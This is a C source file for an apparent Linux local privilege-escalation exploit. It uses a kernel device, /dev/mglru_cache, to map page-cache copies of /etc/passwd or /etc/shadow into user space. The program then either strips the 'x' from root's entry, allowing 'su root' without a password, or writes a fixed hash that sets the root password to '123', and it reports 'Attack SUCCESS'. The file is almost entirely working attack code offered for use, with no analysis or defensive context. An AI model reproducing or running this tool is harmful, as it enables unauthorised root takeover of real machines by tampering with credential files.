#define _GNU_SOURCE

#include <crypt.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <termios.h>
#include <unistd.h>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)

#define PHYS_MEM_GET_MGLRU_PAGES_COUNT _IOWR('P', 1, struct zone_inspect_req)
#define PHYS_MEM_GET_MGLRU_PAGES_DATA _IOWR('P', 2, struct zone_inspect_req)
#define PHYS_MEM_CLEANUP_CAPTURED_PAGE _IO('P', 3)

#define PHANTOM_PASSWD_MMAP_OFFSET 0
#define PHANTOM_SHADOW_MMAP_OFFSET 1

static volatile bool g_phantom_page_found = false;
static int g_dev_fd = -1;

enum AttackMode { MODE_CLR_PASS, MODE_CHG_PASS };

enum zone_type { ZONE_DMA, ZONE_DMA32, ZONE_NORMAL };

struct user_mglru_page_cache {
	uint64_t pfn;
	uint64_t page_vaddr;
	int32_t node_id;
	int32_t zone_type;
	int32_t lru_gen;
	int32_t lru_tier;
	int32_t folio_order;
	uint64_t lrugen_seq;
	uint32_t pageflags;
	char filename[256];
	char cgroup_path[256];
};

struct zone_inspect_req {
	int32_t node_id;
	int32_t zone_type;
	uint64_t user_buffer;
	uint32_t buffer_len;
	uint32_t result_count;
};

struct thread_args {
	int dev_fd;
	enum AttackMode mode;
};

static char *zone_type_string(int zone_type)
{
	switch (zone_type) {
	case ZONE_NORMAL:
		return "NORMAL";
	case ZONE_DMA32:
		return "DMA32";
	case ZONE_DMA:
		return "DMA";
	}

	return "UNKNOWN";
}

long inspect_krnl_node_mglru_pagecache_count(int dev_fd, int node_id, bool verbose)
{
	struct zone_inspect_req req;
	long total_pages;
	int rt;

	rt = 0;
	memset(&req, 0, sizeof(req));
	req.node_id = node_id;

	if (verbose)
		printf("\nRequesting page count for Node %d\n", node_id);

	rt = ioctl(dev_fd, PHYS_MEM_GET_MGLRU_PAGES_COUNT, &req);
	if (rt < 0) {
		if (verbose)
			perror("ioctl(GET_COUNT) failed");
		return -1;
	}

	total_pages = req.result_count;
	if (total_pages <= 0) {
		if (verbose)
			printf("No MGLRU pages found\n");
		return -1;
	}

	if (verbose)
		printf("Found %ld MGLRU pages\n", total_pages);

	return total_pages;
}

int inspect_krnl_node_mglru_pagecache_data(int dev_fd, int node_id, long total_pages)
{
	struct zone_inspect_req req;
	struct user_mglru_page_cache *page_cache_buffer;
	struct user_mglru_page_cache *current_page;
	int rt;
	int i;

	rt = 0;
	memset(&req, 0, sizeof(req));
	req.node_id = node_id;

	page_cache_buffer = malloc(total_pages * sizeof(struct user_mglru_page_cache));
	if (!page_cache_buffer) {
		printf("malloc failed\n");
		return -1;
	}

	req.user_buffer = (uint64_t)(uintptr_t)page_cache_buffer;
	req.buffer_len = total_pages;
	rt = ioctl(dev_fd, PHYS_MEM_GET_MGLRU_PAGES_DATA, &req);
	if (rt < 0) {
		perror("ioctl(GET_DATA) failed");
		free(page_cache_buffer);
		return rt;
	}

	printf("\n--- MGLRU Page Info ---\n");
	for (i = 0; i < req.result_count; i++) {
		current_page = &page_cache_buffer[i];
		static char flags_str[64];

		flags_str[0] = '\0';
		if (current_page->pageflags & (1 << 1))
			strcat(flags_str, "Workingset,");
		if (current_page->pageflags & (1 << 0))
			strcat(flags_str, "Ref,");

		if (strlen(flags_str) > 0)
			flags_str[strlen(flags_str) - 1] = '\0';
		else
			strcpy(flags_str, "-");

		printf("PFN:0x%-8lx VA:0x%-12lx Gen:%d Tier:%d Flags:[%s] File:%s\n",
		       current_page->pfn,
		       current_page->page_vaddr,
		       current_page->lru_gen,
		       current_page->lru_tier,
		       flags_str,
		       current_page->filename);
	}

	free(page_cache_buffer);
	return rt;
}

void modify_phantom_page(char *p_mem, char *s_mem, enum AttackMode mode)
{
	char temp_buffer[PAGE_SIZE];
	char *line_start;
	char *buffer_ptr;
	bool root_found;
	bool modified;

	if (mode == MODE_CLR_PASS) {
		if (!p_mem) {
			fprintf(stderr, "error: phantom 0 page is null\n");
			return;
		}

		line_start = p_mem;
		modified = false;

		while (line_start < p_mem + PAGE_SIZE && *line_start != '\0') {
			if (strncmp(line_start, "root:", 5) == 0) {
				char *first_colon = strchr(line_start, ':');
				if (first_colon) {
					char *second_colon = first_colon + 1;
					if (*second_colon == 'x' && *(second_colon + 1) == ':') {
						memmove(second_colon,
							second_colon + 1,
							strlen(second_colon + 1) + 1);
						modified = true;
						break;
					}
				}
			}

			char *line_end = strchr(line_start, '\n');
			if (line_end)
				line_start = line_end + 1;
			else
				break;
		}

		if (modified)
			printf("phantom 0 page modified, root password cleared\n");
		else
			printf("warning: root:x: pattern not found in phantom 0\n");

	} else if (mode == MODE_CHG_PASS) {
		const char *new_hash = "$y$j9T$VUqieP56.YB32vwWJNlNQ0$TtLae/81H4t1."
				       "bld/3tx3gofjWwQRLUQctIqtmSiAS3";

		if (!s_mem) {
			fprintf(stderr, "error: phantom 1 page is null\n");
			return;
		}

		line_start = s_mem;
		buffer_ptr = temp_buffer;
		root_found = false;

		memset(temp_buffer, 0, PAGE_SIZE);

		while (line_start < s_mem + PAGE_SIZE && *line_start != '\0') {
			char *line_end = strchr(line_start, '\n');
			size_t line_len;
			char current_line[256] = {0};

			line_len = line_end ? (line_end - line_start) : strlen(line_start);
			strncpy(current_line, line_start, line_len);

			if (strncmp(current_line, "root:", 5) == 0) {
				root_found = true;
				char *first_colon = strchr(current_line, ':');
				if (first_colon) {
					char *second_colon = strchr(first_colon + 1, ':');
					if (second_colon) {
						*first_colon = '\0';
						sprintf(buffer_ptr,
							"%s:%s%s\n",
							current_line,
							new_hash,
							second_colon);
					}
				}
			} else {
				sprintf(buffer_ptr, "%s\n", current_line);
			}

			buffer_ptr += strlen(buffer_ptr);

			if (line_end)
				line_start = line_end + 1;
			else
				break;
		}

		if (root_found) {
			memset(s_mem, 0, PAGE_SIZE);
			strcpy(s_mem, temp_buffer);
			printf("phantom 1 page modified, root password set to '123'\n");
		} else {
			printf("warning: root line not found in phantom 1\n");
		}
	}
}

void set_terminal_raw(struct termios *orig_term)
{
	struct termios term;

	tcgetattr(STDIN_FILENO, orig_term);
	term = *orig_term;
	term.c_lflag &= ~(ICANON | ECHO);
	tcsetattr(STDIN_FILENO, TCSANOW, &term);
}

void reset_terminal(struct termios orig_term) { tcsetattr(STDIN_FILENO, TCSANOW, &orig_term); }

void wait_for_exit_key(int dev_fd)
{
	struct termios orig_term;

	printf("\nPress 'x' to exit and cleanup phantom pages.\n");

	set_terminal_raw(&orig_term);

	while (getchar() != 'x')
		;
	if (ioctl(dev_fd, PHYS_MEM_CLEANUP_CAPTURED_PAGE, NULL) < 0)
		perror("\nioctl(CLEANUP) failed");
	else
		printf("\n\nCleanup complete, pages returned to 'buddy system'.\n");

	reset_terminal(orig_term);
}

void clear_screen(void)
{
	printf("\033[2J");
	printf("\033[H");
	fflush(stdout);
}

void *listen_thread_func(void *arg)
{
	struct thread_args *args = (struct thread_args *)arg;
	char *target_mem;
	off_t mmap_offset;
	const char *target_file;
	long total_pages;
	struct user_mglru_page_cache *buf;
	struct zone_inspect_req req;

	target_mem = NULL;
	g_phantom_page_found = false;

	mmap_offset =
	    (args->mode == MODE_CLR_PASS) ? PHANTOM_PASSWD_MMAP_OFFSET : PHANTOM_SHADOW_MMAP_OFFSET;

	target_file = (args->mode == MODE_CLR_PASS) ? "phantom page 0" : "phantom page 1";

	while (g_phantom_page_found == false) {

		total_pages = inspect_krnl_node_mglru_pagecache_count(args->dev_fd, 0, false);

		if (total_pages > 0) {

			buf = malloc(total_pages * sizeof(*buf));
			if (buf) {
				memset(&req, 0, sizeof(req));
				req.node_id = 0;
				req.zone_type = 0;
				req.user_buffer = (uint64_t)(uintptr_t)buf;
				req.buffer_len = (uint32_t)total_pages;
				req.result_count = 0;

				ioctl(args->dev_fd, PHYS_MEM_GET_MGLRU_PAGES_DATA, &req);

				free(buf);
			}
		}

		target_mem = mmap(NULL,
				  PAGE_SIZE,
				  PROT_READ | PROT_WRITE,
				  MAP_SHARED,
				  args->dev_fd,
				  mmap_offset * PAGE_SIZE);

		if (target_mem != MAP_FAILED) {

			if (args->mode == MODE_CLR_PASS)
				modify_phantom_page(target_mem, NULL, args->mode);
			else
				modify_phantom_page(NULL, target_mem, args->mode);

			munmap(target_mem, PAGE_SIZE);
			g_phantom_page_found = true;

			break;
		}

		printf("\rWaiting for %s in pagecache... ", target_file);
		fflush(stdout);
		sleep(5);
	}

	return NULL;
}

void handle_phantom_page_mode(int dev_fd, enum AttackMode mode)
{
	char *target_mem;
	off_t mmap_offset;
	const char *target_file;
	long total_pages;
	struct user_mglru_page_cache *buf;
	struct zone_inspect_req req;

	target_mem = NULL;

	mmap_offset =
	    (mode == MODE_CLR_PASS) ? PHANTOM_PASSWD_MMAP_OFFSET : PHANTOM_SHADOW_MMAP_OFFSET;

	target_file = (mode == MODE_CLR_PASS) ? "phantom page 0" : "phantom page 1";

	printf("Capturing %s...\n", target_file);

	total_pages = inspect_krnl_node_mglru_pagecache_count(dev_fd, 0, false);
	if (total_pages > 0) {

		buf = malloc(total_pages * sizeof(*buf));
		if (buf) {
			memset(&req, 0, sizeof(req));
			req.node_id = 0;
			req.zone_type = 0;
			req.user_buffer = (uint64_t)(uintptr_t)buf;
			req.buffer_len = (uint32_t)total_pages;
			req.result_count = 0;

			ioctl(dev_fd, PHYS_MEM_GET_MGLRU_PAGES_DATA, &req);
			free(buf);
		}
	}

	target_mem = mmap(NULL,
			  PAGE_SIZE,
			  PROT_READ | PROT_WRITE,
			  MAP_SHARED,
			  dev_fd,
			  mmap_offset * PAGE_SIZE);

	if (target_mem == MAP_FAILED) {
		fprintf(stderr, "mmap %s failed, page not in cache\n", target_file);
		return;
	}

	printf("Phantom page for %s mapped at %p\n", target_file, target_mem);

	if (mode == MODE_CLR_PASS)
		modify_phantom_page(target_mem, NULL, mode);
	else
		modify_phantom_page(NULL, target_mem, mode);

	munmap(target_mem, PAGE_SIZE);

	wait_for_exit_key(dev_fd);
}

void handle_listen_phantom_mode(int dev_fd, enum AttackMode mode)
{
	pthread_t listener;
	struct thread_args args;

	args.dev_fd = dev_fd;
	args.mode = mode;

	if (pthread_create(&listener, NULL, listen_thread_func, &args) != 0) {

		perror("pthread_create failed");
		return;
	}

	pthread_join(listener, NULL);

	if (g_phantom_page_found) {
		printf("\rWaiting... Done.                        \n");

		if (mode == MODE_CLR_PASS)
			printf("\nAttack SUCCESS: password-less 'su root' enabled.\n");
		else
			printf("\nAttack SUCCESS: root password set to '123'.\n");

		wait_for_exit_key(dev_fd);
	}
}

void print_usage(const char *prog_name)
{
	printf("Usage: %s <main-option> [sub-option]\n\n", prog_name);
	printf("Options:\n");
	printf("  --dump-mglru\n");
	printf("      Scan and display MGLRU file pages.\n");
	printf("  --phantom-page <sub-option>\n");
	printf("      Find and map a target page instantly.\n");
	printf("  --listen-phantom <sub-option>\n");
	printf("      Continuously scan and modify a target page.\n\n");
	printf("Sub-options:\n");
	printf("  -clrpass : Clear root password via phantom 0.\n");
	printf("  -chgpass : Set root password to '123' via phantom 1.\n");
}

int main(int argc, char **argv)
{
	const char *main_option;
	const char *sub_option;
	enum AttackMode attack_mode;

	if (argc < 2) {
		print_usage(argv[0]);
		return 1;
	}

	g_dev_fd = open("/dev/mglru_cache", O_RDWR);
	if (g_dev_fd < 0) {
		perror("open /dev/mglru_cache");
		exit(EXIT_FAILURE);
	}

	main_option = argv[1];

	if (strcmp(main_option, "--dump-mglru") == 0) {

		long total_pages = inspect_krnl_node_mglru_pagecache_count(g_dev_fd, 0, true);

		if (total_pages > 0)
			inspect_krnl_node_mglru_pagecache_data(g_dev_fd, 0, total_pages);

	} else if (strcmp(main_option, "--phantom-page") == 0 ||
		   strcmp(main_option, "--listen-phantom") == 0) {

		clear_screen();

		if (argc != 3) {
			fprintf(stderr, "Error: %s requires a sub-option\n", main_option);
			print_usage(argv[0]);
			close(g_dev_fd);
			return 1;
		}

		sub_option = argv[2];

		if (strcmp(sub_option, "-clrpass") == 0) {

			attack_mode = MODE_CLR_PASS;
			printf("Mode: Clear root password via phantom 0\n");

		} else if (strcmp(sub_option, "-chgpass") == 0) {

			attack_mode = MODE_CHG_PASS;
			printf("Mode: Change root password via phantom 1\n");

		} else {
			fprintf(stderr, "Error: Unknown sub-option '%s'\n", sub_option);
			print_usage(argv[0]);
			close(g_dev_fd);
			return 1;
		}

		if (strcmp(main_option, "--phantom-page") == 0)

			handle_phantom_page_mode(g_dev_fd, attack_mode);
		else

			handle_listen_phantom_mode(g_dev_fd, attack_mode);

	} else {
		fprintf(stderr, "Error: Unknown option: %s\n", main_option);
		print_usage(argv[0]);
	}

	close(g_dev_fd);
	return 0;
}
